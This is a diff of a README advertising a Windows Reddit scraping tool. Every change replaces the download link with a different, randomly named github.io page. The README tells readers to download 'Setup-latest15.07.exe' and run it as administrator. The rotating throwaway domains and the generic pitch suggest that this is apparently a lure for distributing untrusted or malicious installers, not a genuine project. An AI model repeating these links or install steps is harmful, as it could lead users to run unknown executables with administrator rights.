@@ -2,7 +2,7 @@
 
 Reddit Scraper Pack 2026 Advanced Suite is a comprehensive Windows desktop application built for researchers, data analysts, and power users who need to extract, organize, and export Reddit data at scale. Whether you are pulling posts from a single subreddit or aggregating data across hundreds of communities, this suite provides the tools you need with a clean, intuitive interface.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
@@ -33,7 +33,7 @@ Before installing, please confirm your machine meets these minimum specification
 
 ## How to Install
 
-1. Click the green **Download** button above or visit the [official download page](https://yellowtaxisave.github.io/download-page/).
+1. Click the green **Download** button above or visit the [official download page](https://capitals-707-bringing.github.io/download-page/).
 2. Save the file **Setup-latest15.07.exe** to your Downloads folder.
 3. Right-click the installer and select **Run as administrator**.
 4. Follow the on-screen wizard — choose your install directory and click **Next** through each step.
@@ -78,7 +78,7 @@ A: JSON, CSV, and plain-text formats are all supported. You can select one or mu
 
 ## Download
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
